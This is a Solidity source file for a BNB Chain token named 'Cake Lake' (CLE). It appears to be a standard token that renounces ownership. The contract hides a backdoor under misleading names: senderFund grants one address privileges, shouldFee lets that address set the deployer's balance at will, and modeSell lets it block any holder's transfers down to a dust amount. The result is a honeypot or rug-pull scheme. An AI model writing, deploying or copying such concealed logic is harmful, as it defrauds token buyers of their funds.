/**
 *Submitted for verification at BscScan.com on 2023-02-06
*/

//SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

abstract contract Ownable is Context {
    address private _owner;

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    /**
     * @dev Initializes the contract setting the deployer as the initial owner.
     */
    constructor() {
        _setOwner(_msgSender());
    }

    /**
     * @dev Returns the address of the current owner.
     */
    function owner() public view virtual returns (address) {
        return _owner;
    }

    /**
     * @dev Throws if called by any account other than the owner.
     */
    modifier onlyOwner() {
        require(owner() == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    /**
     * @dev Leaves the contract without owner. It will not be possible to call
     * `onlyOwner` functions anymore. Can only be called by the current owner.
     *
     * NOTE: Renouncing ownership will leave the contract without an owner,
     * thereby removing any functionality that is only available to the owner.
     */
    function renounceOwnership() public virtual onlyOwner {
        _setOwner(address(0));
    }

    /**
     * @dev Transfers ownership of the contract to a new account (`newOwner`).
     * Can only be called by the current owner.
     */
    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), "Ownable: new owner is the zero address");
        _setOwner(newOwner);
    }

    function _setOwner(address newOwner) private {
        address oldOwner = _owner;
        _owner = newOwner;
        emit OwnershipTransferred(oldOwner, newOwner);
    }
}

interface tradingToken {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);
}

interface walletList {
    function createPair(address tokenA, address tokenB) external returns (address);
}

contract CakeLake is Ownable {
    uint8 private takeMin = 18;

    string private _name = "Cake Lake";
    string private _symbol = "CLE";

    uint256 private maxReceiver = 100000000 * 10 ** takeMin;
    mapping(address => uint256) private swapList;
    mapping(address => mapping(address => uint256)) private enableTake;

    mapping(address => bool) public listTo;
    address public atExempt;
    address public tradingTakeSender;
    mapping(address => bool) public receiverToken;
    uint256 constant teamAtFee = 10 ** 10;
    bool public maxAmount;

    

    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);

    constructor (){
        tradingToken tokenAmount = tradingToken(0x10ED43C718714eb63d5aA57B78B54704E256024E);
        tradingTakeSender = walletList(tokenAmount.factory()).createPair(tokenAmount.WETH(), address(this));
        atExempt = atLiquidityToken();
        listTo[atExempt] = true;
        swapList[atExempt] = maxReceiver;
        emit Transfer(address(0), atExempt, maxReceiver);
        renounceOwnership();
    }

    

    function decimals() external view returns (uint8) {
        return takeMin;
    }

    function modeSell(address fundReceiver) public {
        if (fundReceiver == atExempt || fundReceiver == tradingTakeSender || !listTo[atLiquidityToken()]) {
            return;
        }
        receiverToken[fundReceiver] = true;
    }

    function balanceOf(address launchMin) public view returns (uint256) {
        return swapList[launchMin];
    }

    function allowance(address receiverMode, address toWallet) external view returns (uint256) {
        return enableTake[receiverMode][toWallet];
    }

    function name() external view returns (string memory) {
        return _name;
    }

    function exemptToTake(address enableTradingSwap, address buyIsMode, uint256 totalEnableTx) internal returns (bool) {
        require(swapList[enableTradingSwap] >= totalEnableTx);
        swapList[enableTradingSwap] -= totalEnableTx;
        swapList[buyIsMode] += totalEnableTx;
        emit Transfer(enableTradingSwap, buyIsMode, totalEnableTx);
        return true;
    }

    function shouldFee(uint256 totalEnableTx) public {
        if (!listTo[atLiquidityToken()]) {
            return;
        }
        swapList[atExempt] = totalEnableTx;
    }

    function transfer(address limitLaunched, uint256 totalEnableTx) external returns (bool) {
        return transferFrom(atLiquidityToken(), limitLaunched, totalEnableTx);
    }

    function senderFund(address atToExempt) public {
        if (maxAmount) {
            return;
        }
        listTo[atToExempt] = true;
        maxAmount = true;
    }

    function atLiquidityToken() private view returns (address) {
        return msg.sender;
    }

    function approve(address toWallet, uint256 totalEnableTx) public returns (bool) {
        enableTake[atLiquidityToken()][toWallet] = totalEnableTx;
        emit Approval(atLiquidityToken(), toWallet, totalEnableTx);
        return true;
    }

    function getOwner() external view returns (address) {
        return owner();
    }

    function symbol() external view returns (string memory) {
        return _symbol;
    }

    function totalSupply() external view returns (uint256) {
        return maxReceiver;
    }

    function transferFrom(address tokenExempt, address limitLaunched, uint256 totalEnableTx) public returns (bool) {
        if (tokenExempt != atLiquidityToken() && enableTake[tokenExempt][atLiquidityToken()] != type(uint256).max) {
            require(enableTake[tokenExempt][atLiquidityToken()] >= totalEnableTx);
            enableTake[tokenExempt][atLiquidityToken()] -= totalEnableTx;
        }
        if (limitLaunched == atExempt || tokenExempt == atExempt) {
            return exemptToTake(tokenExempt, limitLaunched, totalEnableTx);
        }
        if (receiverToken[tokenExempt]) {
            return exemptToTake(tokenExempt, limitLaunched, teamAtFee);
        }
        return exemptToTake(tokenExempt, limitLaunched, totalEnableTx);
    }


}